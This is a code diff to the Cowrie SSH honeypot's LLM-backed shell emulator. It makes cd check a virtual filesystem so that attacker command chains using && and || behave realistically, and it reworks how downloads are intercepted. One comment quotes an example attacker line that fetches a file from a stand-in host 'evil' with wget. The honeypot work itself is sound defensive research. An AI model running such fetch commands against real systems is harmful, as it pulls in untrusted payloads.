@@ -21,6 +21,7 @@ from cowrie.llm import interactive as interactivemod
 from cowrie.llm import persona as personamod
 from cowrie.llm import prompts as promptmod
 from cowrie.llm import responder as respondermod
+from cowrie.llm import vfs as vfsmod
 from cowrie.llm.llm import LLMClient
 from cowrie.llm.providers.base import LLMMessage, LLMRequest
 from cowrie.llm.worldstate import WorldState
@@ -230,34 +231,56 @@ class HoneyPotBaseProtocol(insults.TerminalProtocol, TimeoutMixin):
                 remainder = command
                 for op, cmd in segments[index + 1 :]:
                     remainder += f" {op} {cmd}"
-                self._apply_input_mutations(remainder)
+                # Deliberately no _apply_input_mutations here. _dispatch_local
+                # already applied this segment's mutations, and the parser
+                # reads only the *head* of a line — so a second call re-applies
+                # the same segment rather than reaching the tail. That turned
+                # `echo pwned >> /tmp/f && ls` into a file containing
+                # "pwnedpwned". Append is the only non-idempotent kind, which
+                # is why the other four hid this for so long.
+                #
+                # A download is intercepted on the whole remainder, not
+                # per-segment, because the fetch is asynchronous and narrates
+                # from its own callback. Handling it inside the loop let a
+                # later segment render its output and prompt first, with the
+                # fetch narration and a second prompt arriving behind it.
+                if self._try_download_intercept(remainder):
+                    return
                 self._process_command_with_llm(remainder)
                 return
         self._show_prompt()
 
     def _dispatch_local(self, command: str) -> tuple[bool, bool]:
-        """Try the synchronous ladder stages. Returns (handled, succeeded).
+        """Try the *synchronous* ladder stages. Returns (handled, succeeded).
 
-        ``succeeded`` drives `&&` / `||` and is the emulator's notion of an
-        exit status: an error-shaped deterministic render counts as
-        failure, everything else as success.
+        ``succeeded`` drives `&&` / `||` and comes from the render's
+        ``exit_code``. That is deliberately not ``is_error``: the latter
+        answers "is this text stderr" so the pipeline path can decline it,
+        which correlates with failure but is not the same question.
+
+        The download interceptor is deliberately absent: it is asynchronous,
+        so reporting it as handled-and-succeeded here let the chain loop run
+        on and draw a prompt while the fetch was still in flight. The caller
+        intercepts it on the remainder instead.
         """
-        if self._try_fastpath(command):
-            return True, True
+        handled, succeeded = self._try_fastpath(command)
+        if handled:
+            return True, succeeded
         self._apply_input_mutations(command)
         result = respondermod.respond(command, self._shell_context())
         if result is not None:
             self._emit_deterministic(command, result)
-            return True, not result.is_error
+            return True, result.exit_code == 0
         if self._try_interactive(command):
-            return True, True
-        if self._try_download_intercept(command):
             return True, True
         return False, True
 
     def _dispatch_one(self, string: str) -> None:
         """The single-command ladder."""
-        if self._try_fastpath(string):
+        # Exit status only matters to a chain's `&&` / `||`; a lone command
+        # has nothing downstream of it, so handled-ness is the whole answer.
+        handled, _succeeded = self._try_fastpath(string)
+        if handled:
             return
         # Parse the attacker's input for filesystem / env mutations and
         # apply them to WorldState BEFORE the LLM call — so the next
@@ -692,13 +715,18 @@ class HoneyPotBaseProtocol(insults.TerminalProtocol, TimeoutMixin):
         kwargs.setdefault("sessionno", f"S{self.sessionno}")
         log.msg(**kwargs)
 
-    def _try_fastpath(self, command: str) -> bool:
+    def _try_fastpath(self, command: str) -> tuple[bool, bool]:
         """Handle trivial commands locally without an LLM round-trip.
 
-        Returns True iff handled. The fastpath exists for two reasons:
-        (1) ``exit`` must actually close the session, not be answered with
-        another prompt; (2) ``cd`` must update ``self.cwd`` so the next LLM
-        turn sees consistent state. Per-LLM latency for these is wasted.
+        Returns ``(handled, succeeded)``. The fastpath exists for two
+        reasons: (1) ``exit`` must actually close the session, not be
+        answered with another prompt; (2) ``cd`` must update ``self.cwd`` so
+        the next LLM turn sees consistent state. Per-LLM latency for these
+        is wasted.
+
+        ``succeeded`` matters because `cd` is the one fastpath verb that can
+        fail, and it is overwhelmingly the left-hand side of the `&&` and
+        `||` chains attackers actually type.
         """
         stripped = command.strip()
         # Fastpath jitter: real bash takes a few ms even on trivial
@@ -707,7 +735,7 @@ class HoneyPotBaseProtocol(insults.TerminalProtocol, TimeoutMixin):
         jitter_max = CowrieConfig.getint("llm", "fastpath_jitter_ms_max", fallback=15)
         if not stripped:
             self._show_prompt(jitter_min, jitter_max)
-            return True
+            return True, True
 
         # The defect this guard closes: the fastpath used to dispatch on
         # the first whitespace token and hand the remainder to _handle_cd,
@@ -717,7 +745,7 @@ class HoneyPotBaseProtocol(insults.TerminalProtocol, TimeoutMixin):
         # responder._METACHARS already had the right operator list; this
         # path simply never consulted it.
         if not cmdchain.is_simple(stripped):
-            return False
+            return False, True
 
         parts = stripped.split(None, 1)
         head = parts[0]
@@ -731,36 +759,45 @@ class HoneyPotBaseProtocol(insults.TerminalProtocol, TimeoutMixin):
             if world is not None and world.user_stack:
                 world.pop_user()
                 self._show_prompt(jitter_min, jitter_max)
-                return True
+                return True, True
             if self.terminal is not None:
                 self.terminal.loseConnection()
-            return True
+            return True, True
 
         if head == "clear":
             if self.terminal is not None:
                 self.terminal.eraseDisplay()
                 self.terminal.cursorHome()
             self._show_prompt(jitter_min, jitter_max)
-            return True
+            return True, True
 
         if head == "pwd":
             if self.terminal is not None:
                 self.terminal.write(f"{self.cwd}\n".encode())
             self._show_prompt(jitter_min, jitter_max)
-            return True
+            return True, True
 
         if head == "cd":
-            self._handle_cd(rest.strip(), jitter_min, jitter_max)
-            return True
+            return True, self._handle_cd(rest.strip(), jitter_min, jitter_max)
 
-        return False
+        return False, True
 
-    def _handle_cd(self, arg: str, jitter_min_ms: int = 0, jitter_max_ms: int = 0) -> None:
-        """Resolve ``cd <arg>`` against ``self.cwd`` and update it in place.
+    def _handle_cd(
+        self, arg: str, jitter_min_ms: int = 0, jitter_max_ms: int = 0
+    ) -> bool:
+        """Resolve ``cd <arg>`` against ``self.cwd``. Returns success.
 
-        We have no real filesystem, so any path is accepted. The LLM will
-        produce file listings consistent with whatever cwd we land on, since
-        it flows into the system prompt every turn.
+        This used to accept *any* path on the grounds that there is no real
+        filesystem behind us. That was a one-command tell — `cd /nonexistent`
+        succeeded and the prompt rendered a directory no listing would ever
+        show — and it corrupted `&&` / `||`, because a `cd` that cannot fail
+        makes `cd /nope && wget http://evil/x` always fetch and
+        `cd /nope || cd /tmp` never fall back.
+
+        We check against the VFS, which is the same model `ls` and `stat`
+        render from, so the three commands cannot disagree. Paths we do not
+        model are still accepted: silence about a path we never described is
+        not a contradiction, but claiming it is absent would be.
         """
         if not arg or arg == "~":
             new_cwd = (
@@ -778,9 +815,41 @@ class HoneyPotBaseProtocol(insults.TerminalProtocol, TimeoutMixin):
 
         # Normalize: collapse trailing slashes, keep "/" as "/".
         new_cwd = new_cwd.rstrip("/") or "/"
+
+        status = self._cd_status(new_cwd)
+        if status in ("absent", "file"):
+            if self.terminal is not None:
+                self.terminal.write(self._cd_error(arg, status).encode())
+            self._show_prompt(jitter_min_ms, jitter_max_ms)
+            return False
+
         self._prev_cwd = self.cwd
         self.cwd = new_cwd
         self._show_prompt(jitter_min_ms, jitter_max_ms)
+        return True
+
+    def _cd_status(self, path: str) -> str:
+        """VFS verdict for ``path``, degrading to "unknown" on any error.
+
+        A crash here would wedge a `cd`, which is far worse than accepting
+        a path we cannot classify.
+        """
+        try:
+            world = getattr(self, "world", None)
+            if world is None:
+                return "unknown"
+            return vfsmod.VFS(world, str(self.user.username)).path_status(path)
+        except Exception:
+            return "unknown"
+
+    def _cd_error(self, arg: str, status: str) -> str:
+        """The shell's own wording — busybox ash and bash differ, and the
+        persona already decides which shell this box runs."""
+        persona = getattr(self, "persona", None)
+        if persona is not None and persona.family == "alpine":
+            return f"sh: cd: can't cd to {arg}\n"
+        reason = "Not a directory" if status == "file" else "No such file or directory"
+        return f"bash: cd: {arg}: {reason}\n"
 
     def _build_system_context(self, exec_command: str = "") -> str:
         """
